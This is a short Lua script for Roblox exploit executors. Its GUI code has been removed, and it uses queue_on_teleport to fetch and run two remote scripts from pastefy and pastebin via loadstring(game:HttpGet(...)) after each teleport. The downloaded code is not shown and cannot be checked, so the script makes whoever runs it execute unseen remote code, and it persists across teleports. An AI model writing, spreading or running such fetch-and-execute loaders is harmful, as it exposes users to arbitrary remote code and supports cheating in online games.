local P=game:GetService("Players")
local p=P.LocalPlayer
 
local function start()
-- GUI removed
end
 
start()
 
local q=queue_on_teleport or queueteleport
 
if q then
    q([[
        loadstring(game:HttpGet("https://pastefy.app/lT0AjQ0p/raw"))()
        loadstring(game:HttpGet("https://pastebin.com/raw/egS7SQpS"))()
    ]])
else
    warn("queue_on_teleport/queueteleport unavailable")
end